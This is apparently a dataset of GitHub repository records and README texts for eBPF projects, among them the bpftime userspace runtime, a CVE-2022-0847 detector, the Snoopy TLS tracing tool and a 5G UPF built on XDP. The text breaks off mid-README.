    Short: ""Brief description"",
    Long: `Detailed description with examples:

Examples:
  ebee toolname                    # Basic usage
  ebee toolname --pid 1234        # Filter by PID
  ebee toolname --comm bash       # Filter by command`,
    Run: runTool,
}

// Clear error handling
func runTool(cmd *cobra.Command, args []string) {
    if err := doSomething(); err != nil {
        log.Fatalf(""Error: %v"", err)
    }
}
```

### ðŸ§ª Testing Requirements

#### Before Submitting
```bash
# 1. Build and test
make clean
make gen_vmlinux
make deps
make build

# 2. Test your tool
sudo ./ebee yourtool

# 3. Test with different filters
sudo ./ebee yourtool --pid $$
sudo ./ebee yourtool --comm bash

# 4. Test on different kernel versions (if possible)
```

#### Documentation Testing
- Verify all links work
- Test all code examples
- Check formatting renders correctly
- Ensure examples produce expected output

### ðŸ”„ Pull Request Process

#### Before Opening a PR
- [ ] **Code compiles** without warnings
- [ ] **Tool works** as documented
- [ ] **Documentation is complete** (following [template](docs/tools/template.md))
- [ ] **Examples are tested** and produce expected output
- [ ] **Commit messages** are clear and descriptive

#### PR Description Template
```markdown
## Summary
Brief description of changes

## Type of Change
- [ ] New eBPF tool
- [ ] Bug fix
- [ ] Documentation improvement
- [ ] Performance optimization

## Testing
- [ ] Tested on Linux (kernel version: X.X.X)
- [ ] Tested on macOS via Lima
- [ ] All examples work as documented
- [ ] No regression in existing tools

## Documentation
- [ ] Updated tool table in README
- [ ] Created/updated tool documentation
- [ ] Included usage examples
- [ ] Added troubleshooting section
```

### ðŸ“š Resources for Contributors

#### Learning eBPF
- [eBPF Fundamentals](docs/ebpf-fundamentals.md) - Start here!
- [Development Setup](docs/development-setup.md) - Environment setup
- [Existing tools](docs/tools/) - Learn from working examples

#### External Resources
- [Cilium eBPF Library](https://github.com/cilium/ebpf) - Go eBPF library we use
- [BCC Tools](https://github.com/iovisor/bcc) - Reference implementations
- [eBPF.io](https://ebpf.io/) - Comprehensive eBPF resources
- [Linux Kernel Documentation](https://www.kernel.org/doc/html/latest/)

### ðŸ†˜ Getting Help

- **Documentation questions**: Open an issue with the `documentation` label
- **Development help**: Open an issue with the `help wanted` label  
- **Bug reports**: Use the bug report template
- **Feature requests**: Use the feature request template

### ðŸŒŸ Recognition

Contributors will be:
- Listed in our contributors section
- Mentioned in release notes for significant contributions
- Invited to review related PRs
- Given credit in tool documentation they create

**Thank you for contributing to ebee! Every contribution helps others learn eBPF development.** ðŸš€

## ðŸ“„ License

This project is licensed under the same license as the original project."
eunomia-bpf/bpftime,1170,120,1170,98,C++,"Userspace eBPF runtime for Observability, Network, GPU & General Extensions Framework",2023-08-10T07:36:11Z,2025-10-12T17:49:05Z,269,"# bpftime: Userspace eBPF runtime for Observability, Network, GPU & General extensions Framework

[![Build and Test VM](https://github.com/eunomia-bpf/bpftime/actions/workflows/test-vm.yml/badge.svg)](https://github.com/eunomia-bpf/bpftime/actions/workflows/test-vm.yml)
[![Build and test runtime](https://github.com/eunomia-bpf/bpftime/actions/workflows/test-runtime.yml/badge.svg)](https://github.com/eunomia-bpf/bpftime/actions/workflows/test-runtime.yml)
[![DOI](https://zenodo.org/badge/676866666.svg)](https://doi.org/10.48550/arXiv.2311.07923)

`bpftime` is a High-Performance userspace eBPF runtime and General Extension Framework designed for userspace. It enables faster Uprobe, USDT, Syscall hooks, XDP, and more event sources by bypassing the kernel and utilizing an optimized compiler like `LLVM`.

ðŸ“¦ [Key Features](#key-features) \
ðŸ”¨ [Quick Start](#quick-start) \
ðŸ”Œ [Examples & Use Cases](#examples--use-cases) \
âŒ¨ï¸ [Linux Plumbers 23 talk](https://lpc.events/event/17/contributions/1639/) \
ðŸ“– [Slides](https://eunomia.dev/bpftime/documents/userspace-ebpf-bpftime-lpc.pdf) \
ðŸ“š [OSDI '25 Paper](https://www.usenix.org/conference/osdi25/presentation/zheng-yusheng)

[**Checkout our documents in eunomia.dev**](https://eunomia.dev/bpftime/) and [Deepwiki](https://deepwiki.com/eunomia-bpf/bpftime)!

bpftime is not `userspace eBPF VM`, it's a userspace runtime framework includes everything to run eBPF in userspace: `loader`, `verifier`, `helpers`, `maps`, `ufunc` and multiple `events` such as Observability, Network, Policy or Access Control. It has multiple VM backend options support. For eBPF VM only, please see [llvmbpf](https://github.com/eunomia-bpf/llvmbpf).

> âš ï¸ **Note**: `bpftime` is currently under active development and refactoring towards v2. It may contain bugs or unstable API. Please use it with caution. For more details, check our [roadmap](#roadmap). We'd love to hear your feedback and suggestions! Feel free to open an issue or [Contact us](#contact-and-citations).

## Why bpftime? What's the design Goal?

- **Performance Gains**: Achieve better performance by `bypassing the kernel` (e.g., via `Userspace DBI` or `Network Drivers`), with more configurable, optimized and more arch supported JIT/AOT options like `LLVM`, while maintaining compatibility with Linux kernel eBPF.
- **Cross-Platform Compatibility**: Enables `eBPF functionality and large ecosystem` where kernel eBPF is unavailable, such as on older or alternative operating systems, or where kernel-level permissions are restricted, without changing your tool.
- **Flexible and General Extension Language & Runtime for Innovation**: eBPF is designed for innovation, evolving into a General Extension Language & Runtime in production that supports very diverse use cases. `bpftime`'s modular design allows easy integration as a library for adding new events and program types without touching kernel. Wishing it could enable rapid prototyping and exploration of new features!

## Key Features

- **Dynamic Binary rewriting**: Run eBPF programs in userspace, attaching them to `Uprobes`, `Syscall tracepoints` and inside `GPU` kernel: **No manual instrumentation or restart required!**. It can `trace` or `change` the execution of a function, `hook` or `filter` all syscalls of a process safely, and efficiently with an eBPF userspace runtime. Can inject eBPF runtime into any running process without the need for a restart or manual recompilation.
- **Performance**: Experience up to a `10x` speedup in Uprobe overhead compared to kernel uprobe and uretprobeï¼Œ up to a 10x faster than `NVbit`. Read/Write userspace memory is also faster than kernel eBPF.
- **Interprocess eBPF Maps**: Implement userspace `eBPF maps` in shared userspace memory for summary aggregation or control plane communication.
- **Compatibility**: use `existing eBPF toolchains` like clang, libbpf and bpftrace to develop userspace eBPF application without any modifications. Supporting CO-RE via BTF, and offering userspace `ufunc` access.
- **Multi JIT Support**: Support [llvmbpf](https://github.com/eunomia-bpf/llvmbpf), a high-speed `JIT/AOT` compiler powered by LLVM, or using `ubpf JIT` and INTERPRETER. The vm can be built as `a standalone library` like ubpf.
- **Run with kernel eBPF**: Can load userspace eBPF from kernel, and using kernel eBPF maps to cooperate with kernel eBPF programs like kprobes and network filters.
- **Integrate with AF_XDP or DPDK**: Run your `XDP` network applications with better performance in userspace just like in kernel!(experimental)

## Components

- [`vm`](https://github.com/eunomia-bpf/bpftime/tree/master/vm): The eBPF VM and JIT compiler for bpftime, you can choose from [bpftime LLVM JIT/AOT compiler](https://github.com/eunomia-bpf/llvmbpf) and [ubpf](https://github.com/iovisor/ubpf). The [llvm-based vm](https://github.com/eunomia-bpf/llvmbpf) in bpftime can also be built as a standalone library and integrated into other projects, similar to ubpf.
- [`runtime`](https://github.com/eunomia-bpf/bpftime/tree/master/runtime): The userspace runtime for eBPF, including the maps, helpers, ufuncs and other runtime safety features.
- [`Attach events`](https://github.com/eunomia-bpf/bpftime/tree/master/attach): support attaching eBPF programs to `Uprobes`, `Syscall tracepoints`, `XDP` and other events with bpf_link, and also the driver event sources.
- [`verifier`](https://github.com/eunomia-bpf/bpftime/tree/master/bpftime-verifier): Support using [PREVAIL](https://github.com/vbpf/ebpf-verifier) as userspace verifier, or using `Linux kernel verifier` for better results.
- [`Loader`](https://github.com/eunomia-bpf/bpftime/tree/master/runtime/syscall-server): Includes a `LD_PRELOAD` loader library in userspace can work with current eBPF toolchain and library without involving any kernel, Another option is [daemon](https://github.com/eunomia-bpf/bpftime/tree/master/daemon) when Linux eBPF is available.

## Quick Start: Uprobe

With `bpftime`, you can build eBPF applications using familiar tools like clang and libbpf, and execute them in userspace. For instance, the [`malloc`](https://github.com/eunomia-bpf/bpftime/tree/master/example/malloc) eBPF program traces malloc calls using uprobe and aggregates the counts using a hash map.

You can refer to [eunomia.dev/bpftime/documents/build-and-test](https://eunomia.dev/bpftime/documents/build-and-test) or the `installation.md` in the repo for how to build the project. Or You can using the container images from [GitHub packages](https://github.com/eunomia-bpf/bpftime/pkgs/container/bpftime).

To get started, you can build and run a libbpf based eBPF program starts with `bpftime` cli:

```console
make -C example/malloc # Build the eBPF program example
export PATH=$PATH:~/.bpftime/
bpftime load ./example/malloc/malloc
```

In another shell, Run the target program with eBPF inside:

```console
$ bpftime start ./example/malloc/victim
Hello malloc!
malloc called from pid 250215
continue malloc...
malloc called from pid 250215
```

You should always run the `load` first then run the `start` command, or the eBPF program will not be attached.

You can also dynamically attach the eBPF program with a running process:

```console
$ ./example/malloc/victim & echo $! # The pid is 101771
[1] 101771
101771
continue malloc...
continue malloc...
```

And attach to it:

```console
$ sudo bpftime attach 101771 # You may need to run make install in root
Inject: ""/root/.bpftime/libbpftime-agent.so""
Successfully injected. ID: 1
```

You can see the output from original program:

```console
$ bpftime load ./example/malloc/malloc
...
12:44:35 
        pid=247299      malloc calls: 10
        pid=247322      malloc calls: 10
```

Alternatively, you can also run our sample eBPF program directly in the kernel eBPF, to see the similar output. This can be an example of how bpftime can work compatibly with kernel eBPF.

```console
$ sudo example/malloc/malloc
15:38:05
        pid=30415       malloc calls: 1079
        pid=30393       malloc calls: 203
        pid=29882       malloc calls: 1076
        pid=34809       malloc calls: 8
```

See [eunomia.dev/bpftime/documents/usage](https://eunomia.dev/bpftime/documents/usage) for more details.

## Examples & Use Cases

For more examples and details, please refer to [eunomia.dev/bpftime/documents/examples/](https://eunomia.dev/bpftime/documents/examples/) webpage and [example](https://github.com/eunomia-bpf/bpftime/tree/master/example/) dir.

## In-Depth

### **How it Works**

bpftime supports two modes:

#### Running in userspace only

Left: original kernel eBPF | Right: bpftime

![How it works](https://eunomia.dev/bpftime/documents/bpftime.png)

In this mode, bpftime can run eBPF programs in userspace without kernel, so it can be ported into low version of Linux or even other systems, and running without root permissions. It relies on a [userspace verifier](https://github.com/vbpf/ebpf-verifier) to ensure the safety of eBPF programs.

#### Run with kernel eBPF

![documents/bpftime-kernel.png](https://eunomia.dev/bpftime/documents/bpftime-kernel.png)

In this mode, bpftime can run together with kernel eBPF. It can load eBPF programs from kernel, and using kernel eBPF maps to cooperate with kernel eBPF programs like kprobes and network filters.

#### Instrumentation implementation

Current hook implementation is based on binary rewriting and the underly technique is inspired by:

- Userspace function hook: [frida-gum](https://github.com/frida/frida-gum)
- Syscall hooks: [zpoline](https://www.usenix.org/conference/atc23/presentation/yasukata) and [pmem/syscall_intercept](https://github.com/pmem/syscall_intercept).
- GPU hooks: our new implementation by converting eBPF into PTX and injecting into GPU kernels. See [attach/nv_attach_impl](https://github.com/eunomia-bpf/bpftime/tree/master/attach/nv_attach_impl) for more details.
- XDP with DPDK. See the [uXDP paper](https://dl.acm.org/doi/10.1145/3748355.3748360) for more details.

The hook can be easily replaced with other DBI methods or frameworks, to make it a general extension framework. See our OSDI '25 paper [Extending Applications Safely and Efficiently](https://www.usenix.org/conference/osdi25/presentation/zheng-yusheng) for details.

### **Performance Benchmarks**

see [github.com/eunomia-bpf/bpf-benchmark](https://github.com/eunomia-bpf/bpf-benchmark) for how we evaluate and details.

### Comparing with Kernel eBPF Runtime

- `bpftime` allows you to use `clang` and `libbpf` to build eBPF programs, and run them directly in this runtime, just like normal kernel eBPF. We have tested it with a libbpf version in [third_party/libbpf](https://github.com/eunomia-bpf/bpftime/tree/master/third_party/libbpf). No specify libbpf or clang version needed.
- Some kernel helpers and kfuncs may not be available in userspace.
- It does not support direct access to kernel data structures or functions like `task_struct`.

Refer to [eunomia.dev/bpftime/documents/available-features](https://eunomia.dev/bpftime/documents/available-features) for more details.

## Build and test

See [eunomia.dev/bpftime/documents/build-and-test](https://eunomia.dev/bpftime/documents/build-and-test) for details.

## License

This project is licensed under the MIT License.

## Contact and citations

Have any questions or suggestions on future development? Feel free to open an issue or contact
<yunwei356@gmail.com> !

Our OSDI '25 paper: <https://www.usenix.org/conference/osdi25/presentation/zheng-yusheng>

```txt
@inproceedings{zheng2025extending,
  title={Extending Applications Safely and Efficiently},
  author={Zheng, Yusheng and Yu, Tong and Yang, Yiwei and Hu, Yanpeng and Lai, Xiaozheng and Williams, Dan and Quinn, Andi},
  booktitle={19th USENIX Symposium on Operating Systems Design and Implementation (OSDI 25)},
  pages={557--574},
  year={2025}
}
```

## Acknowledgement

eunomia-bpf community is sponsored by [PLCT Lab](https://plctlab.github.io/) from [ISCAS](http://english.is.cas.cn/au/).

Thanks for other sponsors and discussions help building this project: [Prof. Marios Kogias](https://marioskogias.github.io/) from Imperial College London, [Prof. Xiaozheng lai](https://www2.scut.edu.cn/cs/2017/0129/c22285a327654/page.htm) from SCUT, [Prof lijun chen](http://www.xiyou.edu.cn/info/2394/67845.htm) from XUPT,
[Prof. Qi Li](https://sites.google.com/site/qili2012/) from THU [NISL Lab](https://netsec.ccert.edu.cn/en/), and Linux eBPF maintainers in the LPC 23 eBPF track.
"
adobeSlash/cilium-kyverno,21,0,21,0,,This repository contains examples of Kyverno policies for controlling the creation of Cilium Network policies,2023-10-30T16:55:27Z,2025-08-07T14:01:40Z,5,"# cilium-kyverno
This repository offers a curated set of Kyverno policies designed to provide granular governance over the creation and modification of Cilium Network Policies.
"
mtardy/mahebpf,5,0,5,1,Go,(For now ðŸ˜¼) an educational eBPF disassembler,2023-10-13T18:44:28Z,2024-09-23T19:01:34Z,2,"# maheBPF

maheBPFâ„¢ for my asinine holistic enterprise BPF pseudocode fragmentor.

## Installation

Install it with a Golang install, the project is nice enough to not have
external dependencies (for now).

```shell-session
go install github.com/mtardy/mahebpf@latest
```

## Usage

### ðŸ§ðŸ»â€â™€ï¸ ELF ðŸ§ðŸ»â€â™‚ï¸

Let's say you have a BPF program in an ELF at the section kprobe/pizza
(little-endian only club ðŸ˜Ž thanks) and you want to disassemble it with a
military-gradeâ„¢ dissasembler:

```shell-session
mahebpf prog.o kprobe/pizza
```

For my very useful little program, the output looks like this:

```text
 0: b701000000000000 r1 = 0
 1: 631afcff00000000 *(u32 *)(r10 - 4) = r1
 2: 850000000e000000 call 14
 3: bf06000000000000 r6 = r0
 4: 636af8ff00000000 *(u32 *)(r10 - 8) = r6
 5: bfa2000000000000 r2 = r10
 6: 07020000fcffffff r2 += -4
 7: 1801000000000000 0000000000000000 r1 = 0 ll
 9: 8500000001000000 call 1
10: 5500090000000000 if r0 != 0 goto +9
11: bfa2000000000000 r2 = r10
12: 07020000fcffffff r2 += -4
13: bfa3000000000000 r3 = r10
14: 07030000f8ffffff r3 += -8
15: 1801000000000000 0000000000000000 r1 = 0 ll
17: b704000000000000 r4 = 0
18: 8500000002000000 call 2
19: 0500010000000000 goto +1
20: 6360000000000000 *(u32 *)(r0 + 0) = r6
21: b700000000000000 r0 = 0
22: 9500000000000000 exit
```

Cool no? A bit like `llvm-objdump -S prog.o` but in bad.

### ðŸ‡ºðŸ‡¸ ASCII ðŸ¦… 

If you like to store your eBPF bytecode in ASCII in a text format like a person
of taste, I got you covered. Let's say you have a program in a `prog.txt` that
looks like this:

```text
b7 01 00 00 00 00 00 00
63 1a fc ff 00 00 00 00
85 00 00 00 0e 00 00 00
bf 06 00 00 00 00 00 00
63 6a f8 ff 00 00 00 00
bf a2 00 00 00 00 00 00
07 02 00 00 fc ff ff ff
18 01 00 00 00 00 00 00
00 00 00 00 00 00 00 00
85 00 00 00 01 00 00 00
55 00 09 00 00 00 00 00
bf a2 00 00 00 00 00 00
07 02 00 00 fc ff ff ff
bf a3 00 00 00 00 00 00
07 03 00 00 f8 ff ff ff
18 01 00 00 00 00 00 00
00 00 00 00 00 00 00 00
b7 04 00 00 00 00 00 00
85 00 00 00 02 00 00 00
05 00 01 00 00 00 00 00
```

To disassemble this hexabeauty:

```shell-session
mahebpf --type ascii prog.txt
```

Boom ðŸ’¥ðŸ¤¯, same output as before!

## Contribute

Don't.
"
h4ckm310n/CVE-2022-0847-eBPF,8,0,8,0,C,An eBPF program to detect attacks on CVE-2022-0847,2023-07-06T01:31:01Z,2024-07-03T22:01:24Z,2,"# CVE-2022-0847-eBPF
An eBPF program to detect and defense attacks on CVE-2022-0847. 

In the kernel space, the program detects **splice()** system calls, if such a system call contains a pipe as the output fd, and the flags of the pipe buffer is set to **PIPE_BUF_FLAG_CAN_MERGE** , then an event would be submitted. In the user space, the program kills the corresponding process that calls **splice()** , and overwrites **/proc/sys/vm/drop_caches** to clear page cache. 

Tested on Ubuntu Server 20.10 with kernel 5.8.0-25.

## Building

```bash
clang -g -O2 -target bpf -D__TARGET_ARCH_x86_64 -I/usr/src/linux-headers-5.8.0-25/include -I/usr/include -c ./splice.bpf.c -o splice.bpf.o
bpftool gen skeleton ./splice.bpf.o > splice.skel.h
clang -I/usr/include -c splice.c -o splice_epbf.o
clang splice_epbf.o -lbpf -lelf -lz -o splice_epbf
```

"
tks98/snoopy,19,4,19,1,Go,Inspect SSL/TLS traffic using eBPF,2023-10-22T01:56:45Z,2025-03-19T16:54:50Z,22,"# snoopy

## Overview

Snoopy is a tool for tracing and monitoring SSL/TLS connections in applications that use common SSL libraries. It leverages eBPF uprobes to hook into SSL functions, collecting metadata before encryption/decryption. This enables Snoopy to monitor SSL traffic without decryption.

Snoopy supports inspecting traffic from applications that use OpenSSL (libssl.so) or GnuTLS (libgnutls.so).


## Building
Snoopy relies on [gobpf](https://github.com/iovisor/gobpf/tree/master), which are Go bindings for bcc. You will need to install [libbcc](https://github.com/iovisor/bcc/blob/master/INSTALL.md) for your specific kernel.

```
go build -o snoopy
```

## Usage

Snoopy supports two optional flags, --json and --pid.

```bash
sudo ./snoopy --json --pid 1337
```

- `json`: Print TLS information in JSON format.
- `pid`: Only print TLS information from a specific process.

Example

```bash
sudo snoopy --json --pid 1716580

{
    ""function"": ""SSL_READ"",
    ""process_name"": ""curl"",
    ""elapsed_time"": 0.022584,
    ""pid"": 1716580,
    ""tid"": 1716580,
    ""message_size"": 1369,
    ""result"": 0,
    ""tls_content"": ""106.8,\""High\"":58335.1....""
}

```
This will print TLS information in JSON format only from process ID 1337.
Not supplying either flag, Snoopy will visually display all intercepted SSL/TLS traffic from all processes that use the OpenSSL library.

```bash
sudo snoopy

[ TLS Message Information ]
+--------------+-----------------+
| DESCRIPTION  | VALUE           |
+--------------+-----------------+
| Timestamp    | 23:26:54.337542 |
| Function     | SSL_READ        |
| Process Name | curl            |
| PID          | 1719190         |
| TID          | 1719190         |
| Message Size | 1369 bytes      |
+--------------+-----------------+
[ TLS Content ]
Open"":0.2,""High"":0.5,""ChangePercentFromLastMonth"":...""}
...
[ End of TLS Message ]
```

## Contributing

Feel free to create issues for bugs and feature requests, or make pull requests to improve the utility.

## License

This project is licensed under the MIT License.

## References 
* https://www.airplane.dev/blog/decrypting-ssl-at-scale-with-ebpf
* https://medium.com/@yunwei356/ebpf-practical-tutorial-capturing-ssl-tls-plain-text-using-uprobe-fccb010cfd64
* https://github.com/eunomia-bpf/bpf-developer-tutorial
* https://www.datadoghq.com/blog/ebpf-guide/
* https://blog.px.dev/ebpf-openssl-tracing/
"
navarrothiago/upf-bpf,209,28,209,17,C++,An In-Kernel Solution Based on eBPF / XDP for 5G UPF,2020-06-24T22:05:47Z,2025-10-12T10:44:17Z,134,"ðŸ› ï¸ **INTEGRATION**: The project has been successfully merged and enhanced within the OAI 5G UPF component. For further details, see the [repository](https://gitlab.eurecom.fr/oai/cn5g/oai-cn5g-upf/-/tree/master/src/upf_app?ref_type=heads).

ðŸ“ **NOTE**: This is an experimental project. The releases are intended for quick access to the artifacts referenced in the publications. Check the [docs](docs/) folder for more information.

# 5G UPF using BPF/XDP

An open source C++ library powered by BPF/XDP for user planes in the mobile core network (5G/LTE).

The key pillars of this project are:

- In-kernel fast packet processing
- Flexible and programmable dataplane
- Portable to different systems

These points are achieved mainly by BPF/XDP and CO-RE (Compile Once - Run Everywhere) technologies.

This project is based on the following 3GPP Technical Specification:
- LTE; 5G; Interface between the Control Plane and the User Plane nodes (3GPP TS 29.244 version 16.5.0 Release 16)
- 5G; System architecture for the 5G System (5GS) (3GPP TS 23.501 version 16.5.0 Release 16)

The main goal is to enable in-kernel fast packet processing in third-party UPF/5G or SPGWu/LTE components in order to:
1. Boost them for those which does not have any fast packet processing enabled, or
2. Co-locate them with other fast packet processing solutions (e.g. DPDK)

Possible scenarios that take advantage of this type of technology: MEC, 5G NPN (Non Public Networks), on-premise, 5G enterprise, and much more.

## Design

The library is divided in layers:
- **Management Layer**: An user space layer responsible to receive requests from the third-party UPF/SPGWu components to manage PFCP sessions and BPF programs lifecycle
- **Datapath Layer**: A kernel space layer representing by BPF/XDP programs responsible to handle the user traffic (datapath) for fast packet processing

The high level design is shown in figure below.

<img src=""img/up-ebpf-xdp-high-level.svg"" alt=""drawing"" width=""500""/>


The library has a component, called `PFCP Session Manager`, which is a C++ API responsible for managing PFCP (Packet Forwarding Control Protocol) sessions. This layer selects the highest PDR and its rules for each PFCP session to compose the datapath Linux kernel. It is the `eBPF Program Manager`, which is responsible for loading/unloading the BPF programs. The BPF program is mapped to each rule defined in highest precedence PDR (e.g. FAR) for each PFCP session created. The fast path is composed of three main functions: Parser, Detection (both in entry BPF section) and Rule. The image below shows this in more detail.

<img src=""img/up-ebpf-xdp-high-level2.svg"" alt=""drawing"" width=""500""/>

- Parser: responsible to parse the GTP and UDP packets
- Detector: responsible for matching the Packet Detection Information (TEID, source interface and UE IP address) with the header of the packet. If matches, so the rules of the PFCP session context must be applied
- Rule: responsible to encapsulate the logic of one rule (e.g. FAR, QER, BAR, etc). Depending on the PFCP session context, it might have more than one rule available in the datapath.

> The FAR is mandatory according to the 3GPP specification

A low-level design (Datapath Layer) is shown below.

<img src=""img/v2-bpf-pipeline-base.svg"" alt=""drawing"" width=""500""/>

### Activity Diagrams

Figure: PFCP session creation activity diagram in Management Layer.

<img src=""img/v2-management-layer.svg"" alt=""drawing"" width=""500""/>

Figure: On new packet received activity diagram in Datapath Layer. There are two pipeline: one with only the FAR and the other one with QER and FAR.

<img src=""img/v2-bpf-pipeline.svg"" alt=""drawing"" width=""500""/>


## Features

As described in 3GPP TS 29.244, the Information Elements (IEs) are part of the PFCP context. The PFCP context is created by sending a PFCP Session Establishment Request message. The main features supported in this project are:

Management Layer - CRUD
- PFCP Session
- PDR (Packet Detection Rule)
- FAR (Forwarding Action Rule)

Fast Datapath Layer
- UDP and GTP parse
- Traffic detection based on PDR
- Traffic forwarding based on FAR

The logical data model between PFCP Session and IEs is shown in the image below. For more detail, see 3GPP TS 29.244 version 16.5.0 Release 16.

<img src=""img/up-ebpf-xdp-ies.svg"" alt=""drawing"" width=""600""/>

## :construction: Future Work

- QER (QoS Enforcement Rule)
- CO-RE for tracing.
- PoC with OpenAirInterface

## Main Dependencies

Core
- libbpf
- bpftool
- spdlog
- clang >= version 3.4.0
- llvm >= version 3.7.1
- kernel-headers => version 5.4
- cmake >= 3.16

Test
- trex v2.86
- sysstat (mpstat)
- ethtool
- gtest

## First Steps

First of all, make sure you have installed [git-lfs](https://git-lfs.github.com/). The LFS repository is used to store the `bpftool` binary.

After downloaded and installed it, clone this repository:

```
git clone https://github.com/navarrothiago/upf-bpf.git
```

After cloning the repository, configure your [env.sh](env.sh) file (on the repository root folder) to match your dev or test environment, using the [.env.sample.sh](.env.sample.sh) file as a template

The project uses a docker container to build the UPF library. The command below will provision the docker image with all the project dependencies.

> :memo: You'll need the Docker Container Runtime package and the Docker Compose utility to set up the dev or test environment

```
make docker-build
```

After that, run the container with:

```
make docker-run
```

> You can also use the vscode development container feature to build the image and login into the container.
> Check [here](https://code.visualstudio.com/docs/remote/create-dev-container#_create-a-devcontainerjson-file) to understand how to open the [devcontainer.json](.devcontainer/devcontainer.json) file.

Inside the container, compile the dependencies with

```
make setup
```

## Build and Installation

The library is built and installed with

```
make install
```

The `package` folder is created with the headers, library and some binaries for testing.

```
package
â”œâ”€â”€ bin       # Contains binaries for testing
â”œâ”€â”€ include   # Contains headers
â”œâ”€â”€ lib       # Contains libupf_xdp.a library
â””â”€â”€ tests     # Contains scripts for testing
```

## How to Test

The test is based on RFC2544-like measurements. The testbed is composed of two servers: Trex Traffic Generator and HTTP API + upf-bpf.

Requirements:

- Both machines with Ubuntu 20.04.02 LTS installed with Linux kernel v5.4.0-72-generic. One machine is used to generate user traffic with TRex Traffic Generator and the other is the DUT (Device Under Test) where the upf-bpf is deployed.
- Both machine contains two NICs
  - For the Trex traffic generator, both NICs drivers must support DPDK. Check out the [Table 5 - Supported NICs](https://trex-tgn.cisco.com/trex/doc/trex_manual.html#_download_and_installation)
  - For DUT, both NICs drivers must support XDP. Check out [here](https://github.com/iovisor/bcc/blob/master/docs/kernel-versions.md#xdp).


Test environment:

<img src=""img/setup-performance-evaluation.svg"" alt=""drawing"" width=""500""/>

Network topology:

<img src=""img/network.svg"" alt=""drawing"" width=""500""/>

### Setup Trex Traffic Generator Server

This machine must have installed the Trex traffic generator. You can check the [trex manual](https://trex-tgn.cisco.com/trex/doc/trex_manual.html) or you can based on the scripts that are called when `make trex` is executed (unstable).

### Setup HTTP API + upf-bpf Server

After running `make install` inside the docker container, copy the application `./package/bin/api` to the DUT machine. **Your host must have kernel >= v5.4**.

Steps:
1. Run Trex Traffic Generator
1. Run HTTP API + upf-bpf
1. Configure interfaces (/configure)
1. Create PFCP Session context (/createSession)
1. Configure the number of Rx queue in DUT
1. Generate the GTP/UDP flows (pkt size = 64B)
1. Collects metrics (CPU load, packet loss, throughput)

For step 1, see the [trex manual](https://trex-tgn.cisco.com/trex/doc/trex_manual.html)

For step 2, run HTTP API + upf-bpf with:
```
sudo ./bin/api 10.1.1.27 80
```

For steps 3 and 4, there are Postman files are available: [Uplink](tests/api/requests_body/gtp-postman-colletion.json) and [Downlink](tests/api/requests_body/udp-postman-colletion.json). Check the JSON message for each step.

For steps 5, 6 and 7, it was implemented a Python [script](https://github.com/navarrothiago/upf-bpf/blob/c1250469a101a10c4b7ac38503a6edda6c5ca1f1/tests/trex/test_cases/run.py) to automate the process. The script executes the test case varying the number of the rx queue. In the end, a report is generated based on JSON format with all the metrics (i.e throughput and CPU load) for each execution. The flows leverage the [Trex Field Engine](https://trex-tgn.cisco.com/trex/doc/cp_stl_docs/api/field_engine.html) to generate the flows. You can also generate the flow manually in the Trex Traffic Generator server.

In order to execute the script, run the following command inside the docker container:
```
export PYTHONPATH='/workspaces/tests/trex/trex_client/interactive/'

# example to generate GTP flow with 12mpps of throughput.
./tests/trex/test_cases/run.py -m 12mpps -p <password_trex_server> -f gtp
# example to generate UDP flow with 100% of throughput.
./tests/trex/test_cases/run.py -m 100% -p <password_trex_server> -f udp
```

> :memo: The `env.sh` file must be configured properly in order to have a successful execution.

There is a tmux session script available [here](tests/scripts/start_session) that were developed to a specific scenario. Some parameters are hardcoded. Feel free to change according to your needs. If you need any help, open an issue or contact me. PR are welcome!!

<img src=""img/tmux-upf.png"" alt=""drawing"" width=""700""/>

> :warning: Some scripts were developed to work in one environment. As you can see in [.env.sample.sh](.env.sample.sh), there are variables to configure the jump server, trex version, GTP and UDP interfaces (downlink and uplink), etc. **You might face some problems when trying to execute some of them, because they were not exhaustive tests in other environments.**

### UTs

Some UTs were developed for the Session Management layer. You can execute inside the container:

```
make config-veth-pair
make build-tests
make run-session-manager-tests
```
If you face any problem, feel free to open an issue or contact me.

## :rocket: Benchmark

Setup: Intel(R) Xeon(R) CPU E5-2620 v2 @ 2.10GHz, 32GiB of the DRAM, 15M of L3 cache, 6 cores (hyper-threading disabled), dual-port 82599ES 10-Gigabit SFI/SFP+ NIC. Both machines have Ubuntu 20.04.02 LTS installed with Linux kernel v5.4.0-72-generic.

> Disable the hyper-threading with `echo off > /sys/devices/system/cpu/smt/control`

**Downlink** | **Uplink**
---|---
<img src=""tests/reports/img/Downlink Max Throughput.svg"" alt=""drawing"" width=""500""/>| <img src=""tests/reports/img/Uplink Max Throughput.svg"" alt=""drawing"" width=""500""/>
<img src=""tests/reports/img/Downlink Max ThroughputLoad per Core - 6 Rx Queue.svg"" alt=""drawing"" width=""500""/>| <img src=""tests/reports/img/Uplink Max ThroughputLoad per Core - 6 Rx Queue.svg"" alt=""drawing"" width=""500""/>

Check the [Jupyter notebook](notebook.ipynb) to see how the graphics are generated.

> :memo: For more graphics, check [this](tests/reports/img) folder.

Time spent to inject BPF program into the kernel after receive the PFCP Establishement Request message.

**Version**| **BPF section** | **BPF Insn** | **Injection (ms)**
--|--|--|--
v1.0.0|PFCP Session|402|27
v2.0.0|FAR|272|1

> :memo: The main reason is due the logic related to lookup the PDR is implemented in the control plane (Management Layer) in v2.0.0 and in the data plane in v1.0.0. The PFCP session was composed with only one FAR.

### Jupyter Notebook

The data collected for uplink (GTP decapsulation) and downlink (GTP encapsulation) e2e testing are available:

- [Uplink - GTP Decapsulation Report](tests/reports/v2.0.0/UplinkMaxThoughtput.json)
- [Downlink - GTP Encapsulation Report](tests/reports/v2.0.0/DownlinkMaxThoughtput.json)

 Firstly, you need to install the python dependencies:

```
# create our virtual environment
python3 -m venv env
# activate our virtual environment
source env/bin/activate
# install dependencies
pip3 install -r requirements.txt
```

Now, you can execute [notebook](notebook.ipynb) using Jupyter.

## Tree

```
â”œâ”€â”€ build: Generated build directory.
â”œâ”€â”€ cmake: Cmake files configuration directory
â”œâ”€â”€ extern: Submodule repositories
â”œâ”€â”€ include: Include files
â”œâ”€â”€ samples: Samples like XDP BPF hello world
â”œâ”€â”€ src: Source files directory
â”œâ”€â”€ tests: UTs, HTTP API srcs, scripts for testing, trex installation
â”œâ”€â”€ Makefile: Encapsulate cmake calls for build, run samples, clean, etc
â””â”€â”€ README.md: Readme file
```

## Trex Traffic Generator

If you faced `FileNotFoundError: [Errno 2] No such file or directory: b'liblibc.a'` when executing trex, for instance:
```
